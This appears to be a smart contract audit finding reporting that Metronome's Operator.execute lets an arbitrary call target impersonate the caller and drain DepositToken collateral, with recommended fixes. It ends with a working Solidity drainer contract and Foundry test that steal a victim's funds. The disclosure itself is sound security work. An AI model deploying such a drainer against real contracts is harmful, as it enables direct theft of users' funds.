### Title
Arbitrary `Operator.execute` target can impersonate the caller and drain unlocked collateral - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` stores the external caller in a transient sender slot and then executes arbitrary contract calls while that authentication context remains active. A malicious call target can invoke Metronome contracts in the same transaction, causing `SynthContext._msgSender()` to resolve the nested call as the original user rather than the malicious contract. The target can therefore transfer or withdraw the user's unlocked `DepositToken` collateral without requiring an allowance or a separate signature.

### Finding Description
`Operator.execute` is a public multicall that accepts attacker-selected target, calldata, and ETH value for every call. [1](#0-0)  Before dispatching those calls, the `setMsgSender` modifier writes `msg.sender` into `MSG_SENDER_STORAGE`, and it clears the slot only after every requested call completes. [2](#0-1)  Each requested target is invoked through a normal external call, so arbitrary contract code runs while the transient sender remains set. [3](#0-2) 

Every `SynthContext` contract treats the configured `Operator` as a trusted forwarder and replaces `msg.sender` with `operator.getActualMsgSender()`. [4](#0-3)  Consequently, if a called contract makes a nested call to a `DepositToken`, that token sees the outer `execute` caller as `_msgSender()`, not the nested malicious contract.

`DepositToken.withdraw` uses this resolved sender as the account being debited and passes the attacker-selected `to_` recipient to `_withdraw`. [5](#0-4)  `_withdraw` burns the victim's deposit-token balance and causes `Treasury.pull` to send the underlying collateral to `to_`. [6](#0-5)  `Treasury.pull` accepts the `DepositToken` caller and transfers its underlying asset to the supplied recipient. [7](#0-6) 

The existing `nonReentrant` guard on `Operator.execute` only prevents reentering `Operator` itself; it does not prevent an arbitrary called contract from calling a different Metronome contract while `MSG_SENDER` is active. [8](#0-7)  The test suite demonstrates the intended forwarding semantics by successfully depositing and withdrawing through `Operator` as Alice. [9](#0-8) [10](#0-9) 

### Impact Explanation
A malicious target included in an `Operator.execute` batch can steal all currently unlocked collateral represented by a victim's `DepositToken` balance. `withdraw` checks only that the requested amount does not exceed the victim's unlocked balance. [11](#0-10) [5](#0-4)  If the victim has no debt, the entire deposit-token balance is unlocked. [12](#0-11) 

For indebted users, the malicious target can still drain the presently withdrawable portion. It can also call `DepositToken.approve(attacker, type(uint256).max)` under the victim's forwarded identity, creating a persistent allowance that can be used later if enough collateral becomes unlocked. [13](#0-12) [14](#0-13)  This breaks sender authentication and enables direct theft of user funds.

### Likelihood Explanation
Exploitation requires an unprivileged victim to invoke `Operator.execute` with a malicious contract as one of the requested calls, which is consistent with phishing or malicious-interface scenarios and does not require any privileged Metronome role. The malicious contract can be deployed by the attacker and can choose the victim's withdrawal amount by querying `unlockedBalanceOf` during the nested call. [15](#0-14) 

The attack is blocked only where normal withdrawal policy already blocks it, such as a shutdown pool, an inactive/removed deposit token, or collateral locked by debt. [16](#0-15)  No pause check, per-call authorization, target allowlist, signature, or subcall-level sender reset prevents the malicious target from inheriting the victim identity.

### Recommendation
Do not expose a global trusted-forwarder identity across arbitrary nested execution. Prefer one of these designs:

- Restrict `Operator.execute` targets to an explicitly allowlisted set of protocol contracts and function selectors, while still avoiding target code that can make arbitrary secondary calls.
- Replace transient forwarding with per-operation signed intents or permit-style approvals scoped to target, selector, amount, recipient, nonce, and deadline.
- Require a hash/commitment of the complete call batch inside any privileged operation that trusts `Operator`, so a selected contract cannot silently add unauthorized protocol calls.
- If arbitrary multicalls must remain supported, clear `MSG_SENDER` before calling an untrusted target and establish it only around direct calls to authorized protocol contracts. Merely suppressing the result or relying on the current reentrancy guard is insufficient because the guard does not propagate to the malicious target's outbound calls.

### Proof of Concept
The following Foundry-style exploit demonstrates the invariant violation. The concrete pool setup can reuse the existing fork fixture shown in `test/Operator.test.ts`, which deploys a configured `Pool`, `PoolRegistry`, `DepositToken`, and `Operator`. [17](#0-16) 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IDepositToken} from "../contracts/interfaces/IDepositToken.sol";
import {IOperator} from "../contracts/interfaces/IOperator.sol";

contract OperatorContextDrainer {
    IDepositToken public immutable depositToken;
    address public immutable attacker;

    constructor(IDepositToken depositToken_, address attacker_) {
        depositToken = depositToken_;
        attacker = attacker_;
    }

    function poke() external {
        uint256 amount = depositToken.unlockedBalanceOf(msg.sender);

        // msg.sender inside this function is Operator. During the nested call,
        // DepositToken resolves Operator's transient sender back to the victim.
        depositToken.withdraw(amount, attacker);
    }
}
```

```solidity
function test_operatorTargetCanDrainUnlockedCollateral() public {
    // Fork/deploy the normal production configuration:
    // PoolRegistry.operator == operator and the pool is registered.

    uint256 amount = 100e6;
    deal(address(usdc), victim, amount);

    vm.startPrank(victim);
    usdc.approve(address(msdUSDC), amount);
    msdUSDC.deposit(amount, victim);
    vm.stopPrank();

    OperatorContextDrainer drainer =
        new OperatorContextDrainer(msdUSDC, attacker);

    IOperator.Call[] memory calls = new IOperator.Call[](1);
    calls[0] = IOperator.Call({
        target: address(drainer),
        value: 0,
        callData: abi.encodeCall(OperatorContextDrainer.poke, ())
    });

    // The victim believes they are only invoking `drainer.poke()`.
    vm.prank(victim);
    operator.execute(calls);

    assertEq(msdUSDC.balanceOf(victim), 0);
    assertEq(usdc.balanceOf(attacker), amount);
}
```

The decisive behavior is that `MSG_SENDER` remains populated for the full batch. [2](#0-1)  When `drainer.poke()` calls `msdUSDC.withdraw`, `SynthContext` sees `msg.sender == operator` and returns the original victim address. [4](#0-3)  `withdraw` therefore debits the victim and sends the underlying collateral to the attacker-controlled recipient. [5](#0-4) [6](#0-5)
